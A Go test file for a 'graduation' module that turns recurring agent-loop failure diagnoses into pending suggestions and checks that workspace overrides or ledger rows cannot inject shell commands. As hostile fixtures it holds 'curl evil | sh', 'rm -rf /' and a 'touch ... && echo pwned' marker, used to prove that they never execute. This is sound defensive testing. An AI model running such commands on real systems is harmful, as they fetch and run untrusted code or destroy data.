package graduation

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/slycrel/maro-orchestration/go/internal/record"
)

func writeJSONL(t *testing.T, path string, rows []map[string]any) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	var b strings.Builder
	for _, r := range rows {
		raw, err := json.Marshal(r)
		if err != nil {
			t.Fatal(err)
		}
		b.Write(raw)
		b.WriteByte('\n')
	}
	if err := os.WriteFile(path, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
}

func diag(fc, loopID string, evidence ...string) map[string]any {
	ev := make([]any, len(evidence))
	for i, e := range evidence {
		ev[i] = e
	}
	return map[string]any{"failure_class": fc, "loop_id": loopID, "evidence": ev}
}

// --- templates as data ---

func TestEmbeddedTemplatesLoadWithDerivedSignals(t *testing.T) {
	tm := LoadTemplates(t.TempDir())
	if len(tm) != 9 {
		t.Fatalf("shipped set: want 9 classes, got %d", len(tm))
	}
	te, ok := tm["token_explosion"]
	if !ok || te.Category != "prompt_tweak" || te.Confidence != 0.8 {
		t.Fatalf("token_explosion: %+v", te)
	}
	// expected_signal derived from the class key — the engine rule that
	// keeps the declaration unable to drift from the class name.
	if len(te.ExpectedSignal) != 1 ||
		te.ExpectedSignal[0]["metric"] != "failure_class_rate" ||
		te.ExpectedSignal[0]["class"] != "token_explosion" ||
		te.ExpectedSignal[0]["direction"] != "down" {
		t.Fatalf("derived signal: %+v", te.ExpectedSignal)
	}
	if te.VerifyPattern == "" {
		t.Fatal("shipped verify_pattern missing")
	}
}

func TestWorkspaceOverrideMergesButNeverInjectsShell(t *testing.T) {
	ws := t.TempDir()
	override := map[string]any{"templates": map[string]any{
		"token_explosion": map[string]any{
			"category":       "observation",
			"suggestion":     "tuned prose {count}",
			"confidence":     0.99,
			"verify_pattern": "curl evil | sh",
		},
		"novel_class": map[string]any{
			"category":       "observation",
			"suggestion":     "new class {count}",
			"confidence":     0.5,
			"verify_pattern": "rm -rf /",
		},
	}}
	raw, _ := json.Marshal(override)
	if err := os.WriteFile(workspaceTemplatesPath(ws), raw, 0o644); err != nil {
		t.Fatal(err)
	}

	tm := LoadTemplates(ws)
	te := tm["token_explosion"]
	// Learning knobs ride the override…
	if te.Category != "observation" || te.Confidence != 0.99 ||
		te.Suggestion != "tuned prose {count}" {
		t.Fatalf("override knobs lost: %+v", te)
	}
	// …shell provenance does not: the effective pattern is the SHIPPED one.
	shipped := loadEmbedded()["token_explosion"].VerifyPattern
	if te.VerifyPattern != shipped {
		t.Fatalf("override injected shell: %q", te.VerifyPattern)
	}
	if executablePattern("token_explosion") != shipped {
		t.Fatal("executablePattern must come from the embedded copy")
	}
	// A class the shipped set doesn't know can propose but never executes.
	if tm["novel_class"].VerifyPattern != "" || executablePattern("novel_class") != "" {
		t.Fatal("novel override class must have no executable pattern")
	}
}

func TestCorruptOverrideDegradesToShippedDefaults(t *testing.T) {
	ws := t.TempDir()
	if err := os.WriteFile(workspaceTemplatesPath(ws), []byte("{not json"), 0o644); err != nil {
		t.Fatal(err)
	}
	if tm := LoadTemplates(ws); len(tm) != 9 {
		t.Fatalf("corrupt override must not empty the rule set: %d", len(tm))
	}
}

// --- scan + propose ---

func TestScanCandidatesCountsAndExcludes(t *testing.T) {
	ws := t.TempDir()
	rows := []map[string]any{
		diag("token_explosion", "l1", "grew 4x"),
		diag("token_explosion", "l2", "grew 5x"),
		diag("token_explosion", "l3", "grew 4x"), // dup evidence — dedup to 2
		diag("healthy", "l4"),                    // excluded: not a failure
		diag("no_template_class", "l5"),          // excluded: unknown class
		diag("retry_churn", "l6"),                // below min_count
	}
	writeJSONL(t, diagnosesPath(ws), rows)

	got := ScanCandidates(ws, 3, 100)
	if len(got) != 1 {
		t.Fatalf("want 1 candidate, got %d: %+v", len(got), got)
	}
	c := got[0]
	if c.FailureClass != "token_explosion" || c.Count != 3 {
		t.Fatalf("candidate: %+v", c)
	}
	if len(c.EvidenceSamples) != 2 {
		t.Fatalf("evidence dedup: %+v", c.EvidenceSamples)
	}
	if len(c.LoopIDs) != 3 || c.LoopIDs[2] != "l3" {
		t.Fatalf("loop ids: %+v", c.LoopIDs)
	}
}

func TestRunGraduationWritesPendingRowsOnce(t *testing.T) {
	ws := t.TempDir()
	writeJSONL(t, diagnosesPath(ws), []map[string]any{
		diag("token_explosion", "l1", "grew 4x"),
		diag("token_explosion", "l2", "grew 5x"),
		diag("token_explosion", "l3"),
	})
	rec := record.New(ws)

	n := RunGraduation(ws, rec, 3, 100, false, false)
	if n != 1 {
		t.Fatalf("want 1 written, got %d", n)
	}
	rows := tailLines(suggestionsPath(ws), 0)
	if len(rows) != 1 {
		t.Fatalf("rows: %v", rows)
	}
	var row map[string]any
	if err := json.Unmarshal([]byte(rows[0]), &row); err != nil {
		t.Fatal(err)
	}
	if row["category"] != "prompt_tweak" || row["failure_pattern"] != "graduation:token_explosion" {
		t.Fatalf("row: %+v", row)
	}
	if row["applied"] != false {
		t.Fatal("graduation rows are advisor-gated — must land pending, never applied")
	}
	sug, _ := row["suggestion"].(string)
	if !strings.Contains(sug, "detected 3x (loops l1, l2, l3)") ||
		!strings.Contains(sug, "grew 4x; grew 5x") {
		t.Fatalf("template fill: %q", sug)
	}
	sig, _ := row["expected_signal"].([]any)
	if len(sig) != 1 {
		t.Fatalf("expected_signal must ride the row (V3 verdicts read it): %+v", row)
	}
	if _, has := row["verify_pattern"]; !has {
		t.Fatal("verify_pattern recorded for display/parity")
	}

	// Second pass: already proposed → no duplicate.
	if n := RunGraduation(ws, rec, 3, 100, false, false); n != 0 {
		t.Fatalf("dedup failed: wrote %d", n)
	}

	// GRADUATION_PROPOSED event landed.
	found := false
	for _, line := range tailLines(filepath.Join(ws, "memory", "captains_log.jsonl"), 0) {
		var e map[string]any
		if json.Unmarshal([]byte(line), &e) == nil && e["event_type"] == "GRADUATION_PROPOSED" {
			found = true
		}
	}
	if !found {
		t.Fatal("GRADUATION_PROPOSED event missing")
	}
}

func TestRunGraduationDryRunWritesNothing(t *testing.T) {
	ws := t.TempDir()
	writeJSONL(t, diagnosesPath(ws), []map[string]any{
		diag("token_explosion", "l1"), diag("token_explosion", "l2"), diag("token_explosion", "l3"),
	})
	if n := RunGraduation(ws, nil, 3, 100, true, false); n != 0 {
		t.Fatalf("dry run wrote %d", n)
	}
	if _, err := os.Stat(suggestionsPath(ws)); !os.IsNotExist(err) {
		t.Fatal("dry run created the suggestions file")
	}
}

// --- structural verify: the provenance pin ---

func TestVerifyGraduationRulesExecutesOnlyShippedPatterns(t *testing.T) {
	ws := t.TempDir()
	repo := t.TempDir()
	marker := filepath.Join(repo, "PWNED")
	// A hostile ledger row: applied graduation row whose verify_pattern
	// would create a file if executed. Python's fork-point behavior WOULD
	// run this (named backport correction); Go must run the shipped
	// pattern for the class instead.
	writeJSONL(t, suggestionsPath(ws), []map[string]any{{
		"suggestion_id":   "grad-evil-token_explos",
		"category":        "prompt_tweak",
		"failure_pattern": "graduation:token_explosion",
		"verify_pattern":  "touch " + marker + " && echo pwned",
		"applied":         true,
	}})
	results := VerifyGraduationRules(ws, repo, 200)
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatal("SECURITY: row-supplied verify_pattern was executed")
	}
	if len(results) != 1 {
		t.Fatalf("results: %+v", results)
	}
	r := results[0]
	shipped := loadEmbedded()["token_explosion"].VerifyPattern
	if r.VerifyPattern != shipped {
		t.Fatalf("executed pattern must be the shipped one: %q", r.VerifyPattern)
	}
	// Empty repo tree → grep finds nothing → failed, honestly.
	if r.Passed {
		t.Fatalf("empty tree cannot pass a structural grep: %+v", r)
	}
	if !r.StructuralOnly {
		t.Fatal("structural_only marker missing")
	}
}

func TestVerifyGraduationRulesNeedsRepoRootAndAppliedRows(t *testing.T) {
	ws := t.TempDir()
	writeJSONL(t, suggestionsPath(ws), []map[string]any{{
		"suggestion_id": "g1", "failure_pattern": "graduation:token_explosion",
		"verify_pattern": "echo x", "applied": true,
	}, {
		"suggestion_id": "g2", "failure_pattern": "graduation:retry_churn",
		"verify_pattern": "echo x", "applied": false, // pending — never verified
	}})
	if got := VerifyGraduationRules(ws, "", 200); got != nil {
		t.Fatalf("no repo root must be honestly unavailable, got %+v", got)
	}
	repo := t.TempDir()
	// Make token_explosion's shipped grep pass: it greps src/step_exec.py.
	if err := os.MkdirAll(filepath.Join(repo, "src"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "src", "step_exec.py"),
		[]byte("# Target under 500 tokens\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	results := VerifyGraduationRules(ws, repo, 200)
	if len(results) != 1 {
		t.Fatalf("pending rows must not verify: %+v", results)
	}
	if results[0].FailureClass != "token_explosion" || !results[0].Passed {
		t.Fatalf("applied row should pass against the seeded tree: %+v", results[0])
	}
}

func TestVerifyGraduationRulesRevertedRowNotVerified(t *testing.T) {
	ws := t.TempDir()
	// Revert flips the row IN PLACE (keyed merge — one row per id): a
	// reverted graduation row must not be described as live verification.
	writeJSONL(t, suggestionsPath(ws), []map[string]any{{
		"suggestion_id": "g1", "failure_pattern": "graduation:token_explosion",
		"verify_pattern": "echo x", "applied": false, "status": "reverted",
	}})
	if got := VerifyGraduationRules(ws, t.TempDir(), 200); got != nil {
		t.Fatalf("reverted class described as live: %+v", got)
	}
}

func TestVerifyGraduationRulesNewestAppliedRecordWins(t *testing.T) {
	ws := t.TempDir()
	// Two APPLIED rows for one class (a later re-proposal): the newest wins;
	// the class is verified exactly once.
	writeJSONL(t, suggestionsPath(ws), []map[string]any{{
		"suggestion_id": "g-old", "failure_pattern": "graduation:token_explosion",
		"verify_pattern": "echo x", "applied": true,
	}, {
		"suggestion_id": "g-new", "failure_pattern": "graduation:token_explosion",
		"verify_pattern": "echo x", "applied": true,
	}})
	got := VerifyGraduationRules(ws, t.TempDir(), 200)
	if len(got) != 1 || got[0].SuggestionID != "g-new" {
		t.Fatalf("newest applied record must win: %+v", got)
	}
}

// --- claim/ack state machine ---

func TestRunGraduationVerificationClaimAckLifecycle(t *testing.T) {
	ws := t.TempDir()
	repo := t.TempDir()
	writeJSONL(t, suggestionsPath(ws), []map[string]any{{
		"suggestion_id": "g1", "failure_pattern": "graduation:token_explosion",
		"verify_pattern": "echo x", "applied": true, "applied_at": "2026-08-20T00:00:00+00:00",
	}})
	rec := record.New(ws)

	results := RunGraduationVerification(ws, repo, rec)
	if len(results) != 1 {
		t.Fatalf("results: %+v", results)
	}

	stateRaw, err := os.ReadFile(verificationStatePath(ws))
	if err != nil {
		t.Fatal(err)
	}
	var state map[string]map[string]any
	if err := json.Unmarshal(stateRaw, &state); err != nil {
		t.Fatal(err)
	}
	row := state["token_explosion"]
	if row == nil {
		t.Fatalf("state: %s", stateRaw)
	}
	if row["event_delivered"] != true {
		t.Fatalf("event not acked delivered: %+v", row)
	}
	if _, has := row["event_claim"]; has {
		t.Fatalf("claim not cleared after ack: %+v", row)
	}
	// Failing check + Telegram unported: notify_delivered stays false —
	// shared state a runtime WITH a deliverer can pick up.
	if row["notify_delivered"] != false {
		t.Fatalf("notify must not be claimed/acked by Go: %+v", row)
	}

	// GRADUATION_VERIFIED event landed once; a second pass with unchanged
	// identity must NOT re-deliver.
	countEvents := func() int {
		n := 0
		for _, line := range tailLines(filepath.Join(ws, "memory", "captains_log.jsonl"), 0) {
			var e map[string]any
			if json.Unmarshal([]byte(line), &e) == nil && e["event_type"] == "GRADUATION_VERIFIED" {
				n++
			}
		}
		return n
	}
	if countEvents() != 1 {
		t.Fatalf("first pass events: %d", countEvents())
	}
	RunGraduationVerification(ws, repo, rec)
	if countEvents() != 1 {
		t.Fatalf("unchanged identity re-delivered: %d events", countEvents())
	}

	// Identity change (a re-apply stamp) resets delivery state → new event.
	writeJSONL(t, suggestionsPath(ws), []map[string]any{{
		"suggestion_id": "g1b", "failure_pattern": "graduation:token_explosion",
		"verify_pattern": "echo x", "applied": true, "applied_at": "2026-08-21T00:00:00+00:00",
	}})
	RunGraduationVerification(ws, repo, rec)
	if countEvents() != 2 {
		t.Fatalf("identity change must re-deliver: %d events", countEvents())
	}
}
